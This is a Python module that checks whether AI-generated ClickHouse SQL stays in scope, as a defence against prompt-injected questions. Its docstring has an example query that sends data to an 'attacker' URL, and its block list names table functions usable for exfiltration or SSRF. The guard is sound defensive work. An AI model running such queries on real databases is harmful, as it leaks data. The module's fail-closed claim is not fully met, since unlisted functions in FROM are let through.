"""Data-scope guardrail for model-generated ClickHouse SQL.

`agent_core.assert_read_only` answers "is this a single SELECT?". That is not
enough. A read-only SELECT can still reach the open internet
(``SELECT * FROM url('http://attacker/x','CSV')``), the local filesystem
(``file(...)``), another cluster (``remote(...)``), or any database the service
user happens to see. A prompt-injected question is exactly how that happens.

`assert_query_scope` closes that hole. It:

  1. strips comments so nothing can hide from the scan,
  2. refuses ClickHouse table functions that read remote/file/exec surfaces,
  3. refuses `SETTINGS`, `INTO OUTFILE`, and format overrides,
  4. extracts every table reference and requires it to be on an explicit
     allowlist (CTE names and derived tables are resolved, not allowlisted).

It fails CLOSED: an identifier it cannot resolve is refused, not permitted.
"""

from __future__ import annotations

import re

# ClickHouse table functions that read something other than a local table.
# Anything here is a data-exfiltration or SSRF surface for generated SQL.
BLOCKED_TABLE_FUNCTIONS = frozenset({
    "url", "urlcluster", "file", "filecluster", "s3", "s3cluster", "gcs",
    "remote", "remotesecure", "cluster", "clusterallreplicas", "mysql",
    "postgresql", "mongodb", "jdbc", "odbc", "hdfs", "hdfscluster",
    "azureblobstorage", "azureblobstoragecluster", "deltalake", "iceberg",
    "hudi", "sqlite", "redis", "executable", "input", "merge", "dictionary",
    "generaterandom", "loop", "fuzzjson", "fuzzquery", "hive", "arrowflight",
})

# Statement-level surfaces that let a SELECT write, reconfigure, or exfiltrate.
_BANNED_PHRASES = (
    (re.compile(r"\binto\s+outfile\b", re.I), "INTO OUTFILE is not allowed"),
    (re.compile(r"\bsettings\b", re.I), "SETTINGS overrides are not allowed"),
    (re.compile(r"\bformat\s+\w+", re.I), "explicit FORMAT is not allowed"),
    (re.compile(r"\binto\s+dumpfile\b", re.I), "INTO DUMPFILE is not allowed"),
)

_LINE_COMMENT = re.compile(r"--[^\n]*")
_BLOCK_COMMENT = re.compile(r"/\*.*?\*/", re.S)
_STRING_LITERAL = re.compile(r"'(?:[^'\\]|\\.|'')*'")

# `FROM x`, `JOIN x` — captures an optionally qualified identifier, possibly
# backticked/quoted. A following `(` means it is a function call, handled apart.
_TABLE_REF = re.compile(
    r"\b(?:from|join)\s+(?!\()\s*([`\"]?[A-Za-z_][\w$]*[`\"]?(?:\s*\.\s*[`\"]?[A-Za-z_][\w$]*[`\"]?)?)\s*(\()?",
    re.I,
)
_FUNC_CALL = re.compile(r"\b([A-Za-z_][\w$]*)\s*\(")
_CTE_NAME = re.compile(r"(?:\bwith\b|,)\s*([A-Za-z_][\w$]*)\s+as\s*\(", re.I)


def strip_comments(sql: str) -> str:
    """Remove SQL comments while preserving string literals verbatim."""
    literals: list[str] = []

    def _stash(match: re.Match) -> str:
        literals.append(match.group(0))
        return f"\x00{len(literals) - 1}\x00"

    masked = _STRING_LITERAL.sub(_stash, sql)
    masked = _BLOCK_COMMENT.sub(" ", masked)
    masked = _LINE_COMMENT.sub(" ", masked)
    return re.sub(r"\x00(\d+)\x00", lambda m: literals[int(m.group(1))], masked)


def _mask_literals(sql: str) -> str:
    """Blank out string literals so their contents cannot trip identifier scans."""
    return _STRING_LITERAL.sub("''", sql)


def assert_query_scope(sql: str, allowed_tables: frozenset[str], default_database: str = "") -> str | None:
    """Return an error string if `sql` reaches outside the allowed data scope.

    Args:
        sql: the query, already known to be a single read-only statement.
        allowed_tables: lowercase ``db.table`` names the agent may read.
        default_database: database used to qualify a bare table name.

    Returns None when the query is in scope.
    """
    if not sql or not sql.strip():
        return "empty query"

    body = _mask_literals(strip_comments(sql))

    for pattern, message in _BANNED_PHRASES:
        if pattern.search(body):
            return message

    # 2) table functions
    for name in _FUNC_CALL.findall(body):
        if name.lower() in BLOCKED_TABLE_FUNCTIONS:
            return f"table function not allowed: {name}()"

    # 3) resolve CTE names so they are not mistaken for physical tables
    cte_names = {n.lower() for n in _CTE_NAME.findall(body)}

    refs: list[str] = []
    for ident, is_call in _TABLE_REF.findall(body):
        if is_call:
            # `FROM someFunc(` — the function-name scan above already vetted it,
            # but an unknown function reading a table is still out of scope.
            fname = ident.strip().strip('`"').lower()
            if fname in BLOCKED_TABLE_FUNCTIONS:
                return f"table function not allowed: {fname}()"
            continue
        cleaned = re.sub(r"[`\"\s]", "", ident).lower()
        refs.append(cleaned)

    if not refs:
        # A constant SELECT (`SELECT 1`) touches no table: allowed.
        if re.search(r"\bfrom\b", body, re.I):
            return "could not resolve the tables this query reads; refused"
        return None

    for ref in refs:
        if ref in cte_names:
            continue
        qualified = ref if "." in ref else (f"{default_database}.{ref}" if default_database else ref)
        if qualified not in allowed_tables:
            return f"table not in the allowed data scope: {qualified}"
    return None
